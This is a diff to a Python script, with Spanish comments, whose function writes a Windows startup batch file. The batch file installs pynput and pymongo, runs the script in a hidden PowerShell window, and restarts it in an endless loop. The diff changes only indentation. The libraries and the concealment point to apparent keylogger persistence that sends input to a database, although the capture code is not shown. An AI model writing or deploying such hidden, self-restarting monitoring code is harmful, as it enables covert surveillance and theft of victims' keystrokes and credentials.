@@ -17,37 +17,37 @@ vscode_path = r"C:\Users\yo\AppData\Local\Programs\Microsoft VS Code\Code.exe"  
 def create_startup_file():
     # Contenido del archivo .bat modificado para incluir el bucle infinito
     bat_content = f'''@echo off
-rem Verificar si Python está instalado
-where python >nul 2>nul
-if %ERRORLEVEL% neq 0 (
-    echo Python no está instalado. Por favor, instale Python.
-    exit /b
-)
+                        rem Verificar si Python está instalado
+                        where python >nul 2>nul
+                        if %ERRORLEVEL% neq 0 (
+                            echo Python no está instalado. Por favor, instale Python.
+                            exit /b
+                        )
 
-rem Instalar las dependencias necesarias
-python -m pip install --upgrade pip
-pip install pynput pymongo
+                        rem Instalar las dependencias necesarias
+                        python -m pip install --upgrade pip
+                        pip install pynput pymongo
 
-rem Verificar si Visual Studio Code está instalado
-if not exist "{vscode_path}" (
-    echo Visual Studio Code no está instalado. Por favor, instale Visual Studio Code.
-    exit /b
-)
+                        rem Verificar si Visual Studio Code está instalado
+                        if not exist "{vscode_path}" (
+                            echo Visual Studio Code no está instalado. Por favor, instale Visual Studio Code.
+                            exit /b
+                        )
 
-rem Ruta del script Python
-set "PYTHON_SCRIPT={current_script}"
+                        rem Ruta del script Python
+                        set "PYTHON_SCRIPT={current_script}"
 
-powershell -windowstyle hidden -command "try {{ python '{current_script}' }} catch {{ echo $_ | Out-File -FilePath '%log_file%' -Append; exit 1 }}"
-    if %ERRORLEVEL% neq 0 (
-        type %log_file%
-        pause
-        exit /b
-    )
-    
-rem Bucle para ejecutar el script continuamente
-:inicio
-python %PYTHON_SCRIPT%
-goto inicio
+                        powershell -windowstyle hidden -command "try {{ python '{current_script}' }} catch {{ echo $_ | Out-File -FilePath '%log_file%' -Append; exit 1 }}"
+                            if %ERRORLEVEL% neq 0 (
+                                type %log_file%
+                                pause
+                                exit /b
+                            )
+                            
+                        rem Bucle para ejecutar el script continuamente
+                        :inicio
+                        python %PYTHON_SCRIPT%
+                        goto inicio
 '''
 
     with open(bat_file_path, 'w') as bat_file:
